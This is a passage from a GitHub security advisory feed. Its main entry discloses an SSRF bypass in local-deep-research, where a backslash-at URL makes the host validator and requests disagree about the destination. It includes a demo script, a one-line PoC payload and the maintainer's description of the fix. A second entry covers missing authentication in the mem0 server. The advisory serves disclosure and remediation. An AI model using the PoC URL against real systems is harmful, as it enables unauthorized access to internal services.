<img src="https://github.com/user-attachments/assets/f3decb16-4daa-49e0-861c-273a913487a0" alt="QQ20260430-212431-30-2" height="1089" width="1164">

<p>The core issue: urlparse() and requests disagree on which host a URL like <code>http://127.0.0.1:6666\@1.1.1.1</code> points to:</p>
<ul>
<li>urlparse() treats \ as a regular character and @ as the userinfo-host delimiter, so it extracts hostname as <code>1.1.1.1</code> (public)</li>
<li>requests treats \ as a path character, connecting to <code>127.0.0.1</code> (internal)</li>
</ul>
<p>Below is a test code I wrote following the code.</p>
<pre><code>#!/usr/bin/env python3
"""Standalone demo: import project via absolute path and call safe_get."""

from __future__ import annotations

import importlib.util
import enum
import sys
import types
from pathlib import Path

# Hardcoded absolute path to the project's "src" directory.
SRC_ROOT = Path(
    r"d:\BaiduNetdiskDownload\local-deep-research-main\local-deep-research-main\src"
)

# Python 3.10 compatibility:
# project constants import StrEnum (available in Python 3.11+).
if not hasattr(enum, "StrEnum"):
    class _CompatStrEnum(str, enum.Enum):
        pass

    enum.StrEnum = _CompatStrEnum  # type: ignore[attr-defined]


def _load_safe_get():
    """Load safe_get directly from file, bypassing package __init__ imports."""
    ldr_pkg_name = "local_deep_research"
    security_pkg_name = "local_deep_research.security"

    # Build lightweight package modules so relative imports in safe_requests.py
    # resolve without executing package __init__.py files.
    if ldr_pkg_name not in sys.modules:
        ldr_pkg = types.ModuleType(ldr_pkg_name)
        ldr_pkg.__path__ = [str(SRC_ROOT / "local_deep_research")]  # type: ignore[attr-defined]
        sys.modules[ldr_pkg_name] = ldr_pkg

    if security_pkg_name not in sys.modules:
        security_pkg = types.ModuleType(security_pkg_name)
        security_pkg.__path__ = [str(SRC_ROOT / "local_deep_research" / "security")]  # type: ignore[attr-defined]
        sys.modules[security_pkg_name] = security_pkg

    module_name = "local_deep_research.security.safe_requests"
    module_path = SRC_ROOT / "local_deep_research" / "security" / "safe_requests.py"

    spec = importlib.util.spec_from_file_location(module_name, module_path)
    if spec is None or spec.loader is None:
        raise ImportError(f"Cannot load module from {module_path}")

    module = importlib.util.module_from_spec(spec)
    sys.modules[module_name] = module
    spec.loader.exec_module(module)
    return module.safe_get


safe_get = _load_safe_get()


def main() -&gt; None:
    # Hardcoded URL for demonstration.
    url = "http://127.0.0.1:6666"
    # url = "http://127.0.0.1:6666\@1.1.1.1"

    safe_get(url, timeout=15)


if __name__ == "__main__":
    main()
</code></pre>
<p>When an attacker uses <code>http://127.0.0.1:6666/</code>, the existing detection logic can detect that this is an internal network address and block it.</p>
<img src="https://github.com/user-attachments/assets/366f684d-9191-4acb-b6a2-b2c3c54f0223" alt="QQ20260430-212723-30-3" height="503" width="1694">

<p>However, when an attacker uses <code>http://127.0.0.1:6666\@1.1.1.1</code>, the detection logic resolves the host to <code>1.1.1.1</code>, which is a public IP address, thus passing the verification. But in the actual request process, this URL is forwarded by requests.get to <code>http://127.0.0.1:6666</code>, bypassing the detection and achieving an SSRF attack.</p>
<img src="https://github.com/user-attachments/assets/bd175e34-d833-44c5-981b-59cfad3406c3" alt="QQ20260430-212833-30-4" height="477" width="2424">

<h3 id="poc">PoC</h3>
<pre><code>http://127.0.0.1:6666\@1.1.1.1
</code></pre>
<h3 id="impact">Impact</h3>
<p>SSRF</p>
<hr>
<h2 id="maintainer-note-2026-05-15">Maintainer note (2026-05-15)</h2>
<p>Thanks @Fushuling and @RacerZ-fighting for the detailed report. The remediation
spans four PRs, all merged to <code>main</code> and shipped in <strong>v1.6.10</strong>:</p>
<p><strong>#3873</strong> (merged 2026-05-08) — the load-bearing fix for the parser-differential
bypass:</p>
<ul>
<li>New <code>RFC_FORBIDDEN_URL_CHARS_RE</code> in <code>security/ssrf_validator.py</code> rejects
URLs containing backslash, ASCII control bytes, or whitespace — RFC 3986
forbids these and their presence signals a parser-differential attempt.</li>
<li>Host extraction switched from <code>urllib.parse.urlparse(url).hostname</code> to
<code>urllib3.util.parse_url(url).host</code>. <code>urllib3</code> is the parser <code>requests</code>
uses internally, so the validator and the HTTP client now agree on the
destination by construction — closing the <code>\@</code> divergence that drove the
PoC.</li>
<li>Same two-layer defence applied to <code>NotificationURLValidator.validate_service_url</code>.</li>
<li>53 new tests across <code>test_ssrf_validator.py</code>, <code>test_notification_validator.py</code>,
<code>test_safe_requests.py</code>, and <code>test_ssrf_redirect_bypass.py</code>, including the
advisory PoC <code>http://127.0.0.1:6666\@1.1.1.1</code> and the post-prepare canonical
form <code>http://127.0.0.1:6666/%5C@1.1.1.1</code>.</li>
</ul>
<p><strong>#3882</strong> (merged 2026-05-08) — hardens the metadata-IP block and redacts
userinfo from log output so rejected URLs don't leak credentials to logs.</p>
<p><strong>#3889</strong> (merged 2026-05-09) — locks in real-world URL fixtures and behavior
invariants from #3873/#3882 as regression tests.</p>
<p><strong>#3932</strong> (merged 2026-05-10) — blocks IPv6 transition prefixes (<code>2002::/16</code>
6to4, <code>64:ff9b::/96</code> NAT64, <code>2001::/32</code> Teredo, <code>100::/64</code> discard) so private
IPv4 destinations cannot be reached via an IPv6-wrapped form. NAT64 has an
operator opt-in (<code>LDR_SECURITY_ALLOW_NAT64=true</code>) for IPv6-only deployments,
but cloud metadata IPs remain blocked regardless.</p>
<h3 id="affected-versions">Affected versions</h3>
<ul>
<li><strong>The specific parser-differential bypass</strong> described above exists from
<strong>v1.3.0</strong> (when <code>validate_url</code> was first introduced) through <strong>v1.6.9</strong>.
The validator used <code>urlparse(url).hostname</code> for that entire span.</li>
<li><strong>Versions before v1.3.0</strong> had no SSRF validator at all — requests went
directly to <code>requests.get()</code> without any host check. Those versions are
vulnerable to SSRF via this URL and any other internal address; the
parser-differential trick is unnecessary.</li>
</ul>
<p>In both cases the remediation is the same: <strong>upgrade to v1.6.10 or later.</strong></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/LearningCircuit/local-deep-research/security/advisories/GHSA-g23j-2vwm-5c25">https://github.com/LearningCircuit/local-deep-research/security/advisories/GHSA-g23j-2vwm-5c25</a></li>
<li><a href="https://github.com/LearningCircuit/local-deep-research/releases/tag/v1.6.10">https://github.com/LearningCircuit/local-deep-research/releases/tag/v1.6.10</a></li>
<li><a href="https://github.com/advisories/GHSA-g23j-2vwm-5c25">https://github.com/advisories/GHSA-g23j-2vwm-5c25</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g23j-2vwm-5c25</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-28T19:18:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mem0ai] mem0 server lacks authentication and authorization controls for its memory management API endpoints]]></title>
        <id>https://github.com/advisories/GHSA-jfv9-68m5-gjjr</id>
        <link href="https://github.com/advisories/GHSA-jfv9-68m5-gjjr"/>
        <updated>2026-05-28T19:13:31.000Z</updated>
        <content type="html"><![CDATA[<p>The mem0 1.0.0 server lacks authentication and authorization controls for its memory management API endpoints. Critical functions such as updating memory records (PUT /memories/{memory_id}) are exposed without any verification of the requester's identity or permissions. A remote attacker can exploit this by sending unauthenticated requests to modify, overwrite, or delete arbitrary memory records, leading to unauthorized data manipulation and potential data loss.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-31240">https://nvd.nist.gov/vuln/detail/CVE-2026-31240</a></li>
<li><a href="https://github.com/mem0ai/mem0">https://github.com/mem0ai/mem0</a></li>
<li><a href="https://www.notion.so/CVE-2026-31240-35d1e13931888170964ae035c04a8f18">https://www.notion.so/CVE-2026-31240-35d1e13931888170964ae035c04a8f18</a></li>
<li><a href="https://github.com/advisories/GHSA-jfv9-68m5-gjjr">https://github.com/advisories/GHSA-jfv9-68m5-gjjr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jfv9-68m5-gjjr</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-12T18:30:41.000Z</published>
    </entry>
</feed>